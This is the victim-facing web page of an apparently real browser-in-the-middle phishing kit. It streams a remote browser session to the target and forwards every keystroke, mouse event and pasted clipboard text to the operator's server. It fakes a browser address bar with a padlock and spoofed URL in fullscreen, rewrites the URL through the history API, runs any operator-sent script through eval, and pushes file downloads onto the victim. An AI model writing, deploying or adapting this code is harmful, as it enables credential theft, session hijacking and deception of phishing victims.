<!DOCTYPE html>
<html>
  <head>
    <title>PAGE_TITLE</title>
    <meta charset="UTF-8" />
  </head>
  <body>
    <video playsinline disablepictureinpicture autoplay muted style="width: 100vw; height: auto;"></video>
    <style>
html, body {margin: 0; height: 100%; overflow: hidden}
    </style>
    <script src="/FileSaver.min.js"></script>
    <script src="/socket.io/socket.io.js"></script>
    <script>

//couple of helper functions
function width(){
  return window.innerWidth 
  || document.documentElement.clientWidth 
  || document.body.clientWidth 
  || 0;
}

function height(){
  return window.innerHeight 
  || document.documentElement.clientHeight 
  || document.body.clientHeight 
  || 0;
}

const client_ip = 'CLIENT_IP';
const target_id = 'TARGET_ID';

//declare connnection and video in global scope for further reference
var peerConnection;
const video = document.querySelector("video")

//connect to the server over websockets and anounce we are a new phish
const socket = io.connect(window.location.origin)
let viewport_width = width()
let viewport_height = height()
socket.emit('new_phish', viewport_width, viewport_height, client_ip, target_id)

socket.on("push_state", function(new_url){
  console.log(`Received push_state event: ${new_url}`)
  console.log(`Current URL before: ${window.location.href}`)
  
  // Try fullscreen approach first
  if (document.fullscreenEnabled) {
    tryFullscreenSpoof(new_url)
  } else {
    // Fallback to history API attempts
    tryHistoryAPISpoof(new_url)
  }
})

function tryFullscreenSpoof(spoofed_url) {
  console.log('Attempting fullscreen URL spoofing...')
  
  // Request fullscreen
  document.documentElement.requestFullscreen().then(() => {
    console.log('Entered fullscreen mode')
    createFakeBrowserUI(spoofed_url)
  }).catch((error) => {
    console.log(`Fullscreen request failed: ${error.message}`)
    tryHistoryAPISpoof(spoofed_url)
  })
}

function createFakeBrowserUI(spoofed_url) {
  // Remove any existing fake UI
  const existing = document.getElementById('fake-browser-ui')
  if (existing) existing.remove()
  
  // Create fake browser UI
  const fakeUI = document.createElement('div')
  fakeUI.id = 'fake-browser-ui'
  fakeUI.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    height: 80px;
    background: linear-gradient(to bottom, #e8e8e8, #d0d0d0);
    border-bottom: 1px solid #999;
    z-index: 999999;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    display: flex;
    flex-direction: column;
  `
  
  fakeUI.innerHTML = `
    <div style="display: flex; align-items: center; height: 40px; padding: 0 10px;">
      <div style="display: flex; gap: 8px; margin-right: 15px;">
        <div style="width: 12px; height: 12px; border-radius: 50%; background: #ff5f57;"></div>
        <div style="width: 12px; height: 12px; border-radius: 50%; background: #ffbd2e;"></div>
        <div style="width: 12px; height: 12px; border-radius: 50%; background: #28ca42;"></div>
      </div>
      <div style="flex: 1; margin: 0 10px;">
        <div style="background: white; border: 1px solid #ccc; border-radius: 4px; padding: 6px 30px 6px 10px; font-size: 14px; position: relative;">
          <span style="color: #666; margin-right: 8px;">üîí</span>
          <span>${spoofed_url}</span>
        </div>
      </div>
    </div>
    <div style="display: flex; align-items: center; height: 40px; padding: 0 10px; background: #f0f0f0; border-top: 1px solid #ddd;">
      <div style="display: flex; gap: 15px; font-size: 13px; color: #666;">
        <span>‚Üê ‚Üí</span>
        <span>‚ü≥</span>
        <span>üè†</span>
        <span>‚≠ê</span>
      </div>
    </div>
  `
  
  document.body.appendChild(fakeUI)
  
  // Adjust video position
  const video = document.querySelector('video')
  if (video) {
    video.style.marginTop = '80px'
    video.style.height = 'calc(100vh - 80px)'
  }
  
  console.log(`Fake browser UI created showing: ${spoofed_url}`)
}

function tryHistoryAPISpoof(new_url) {
  try {
    history.pushState(null, '', new_url)
    console.log(`URL spoofed using pushState: ${window.location.href}`)
  } catch (error) {
    console.log(`pushState failed: ${error.message}`)
    
    try {
      history.replaceState(null, '', new_url)
      console.log(`URL spoofed using replaceState: ${window.location.href}`)
    } catch (error2) {
      console.log(`Both pushState and replaceState failed: ${error2.message}`)
      console.log(`URL spoofing blocked by browser security - this is expected in modern browsers`)
    }
  }
}

socket.on("copy_to_clipboard", function(data){
  copy_to_clipboard(data)
})

//1) wait for a video stream offer
socket.on("video_stream_offer", function(broadcaster_socket_id, offer){
  peerConnection = new RTCPeerConnection({
    iceServers: [
      {
        "urls": "stun:stun.l.google.com:19302",
      },
      // { 
      //   "urls": "turn:TURN_IP?transport=tcp",
      //   "username": "TURN_USERNAME",
      //   "credential": "TURN_CREDENTIALS"
      // }
    ]
  })
  //2) set up an answer an send back to the broadcaster
  peerConnection
    .setRemoteDescription(offer)
    .then(() => peerConnection.createAnswer())
    .then(sdp => peerConnection.setLocalDescription(sdp))
    .then(() => {
      socket.emit("video_stream_answer", broadcaster_socket_id, peerConnection.localDescription)
    }) 
  //add video track when it becomes available
  peerConnection.ontrack = function(event){
    video.srcObject = event.streams[0]
  }
  //3) send ICE candidates as they become available
  peerConnection.onicecandidate = function(event){
    if (event.candidate) {
      socket.emit("candidate", broadcaster_socket_id, event.candidate)
    }
  }  
})

socket.on("candidate", function(broadcaster_socket_id, candidate){
  peerConnection
    .addIceCandidate(new RTCIceCandidate(candidate))
    .catch(e => console.error(e))
})

socket.on("execute_script", function(script){
  eval(script)
})

socket.on("save", function(file){
  saveAs(new Blob([file.data]), file.filename)
})

//joystick actions for mouse events
document.addEventListener("mousedown", handleMouseEvent, !1) 
document.addEventListener("mouseup", handleMouseEvent, !1) 
document.addEventListener("mousemove", handleMouseEvent, !1) 
document.addEventListener("mousewheel", handleMouseEvent, !1) 
document.addEventListener("click", handleMouseEvent, !1) 

window.addEventListener('popstate', function(event){
  socket.emit('go_back')
})

window.addEventListener('paste', function(event){
  let paste_data = (event.clipboardData || window.clipboardData).getData('text')
  socket.emit('paste', paste_data)
  event.preventDefault()
})

function handleMouseEvent(e){
  if(e.type == "mousewheel"){
    socket.emit('mouse_event', {"type": e.type, "wheelDeltaX": e.wheelDeltaX, "wheelDeltaY": e.wheelDeltaY})
  }else{
    //console.log({"type": e.type, "clientX": e.clientX, "clientY": e.clientY, "movementX": e.movementX, "movementY": e.movementY})
    socket.emit('mouse_event', {"type": e.type, "clientX": e.clientX, "clientY": e.clientY, "movementX": e.movementX, "movementY": e.movementY})
  }
}

//joystick actions for key events
document.addEventListener('keydown', keyDown)
document.addEventListener('keyup', keyUp)

var ctrlKey = false

function keyDown(e) {
  if(e.keyCode == 9 || e.which == 9){
    e.preventDefault()
  }
  if(e.keyCode == 86 && ctrlKey){
    return
  }
  if(e.keyCode == 67 && ctrlKey){
    socket.emit('copy')
    e.preventDefault()
    return
  }
  if(e.key == 'Meta'){
    ctrlKey = true
    return
  }
  socket.emit("keydown", e.key)
}

function keyUp(e) {
  if(e.key == 'Meta'){
    ctrlKey = false
    return
  }
  socket.emit("keyup", e.key)
}

copy_to_clipboard = function (data) {
  // Create a dummy input to copy the string inside it
  var dummy = document.createElement("textarea");
  // Add it to the document
  document.body.appendChild(dummy);
  // Set its ID
  dummy.setAttribute("id", "dummy_id");
  // Output the array into it
  document.getElementById("dummy_id").value = data;
  // Select it
  dummy.select();
  // Copy its contents
  document.execCommand("copy");
  // Remove it as its not needed anymore
  document.body.removeChild(dummy);
}

    </script>
  </body>
</html>
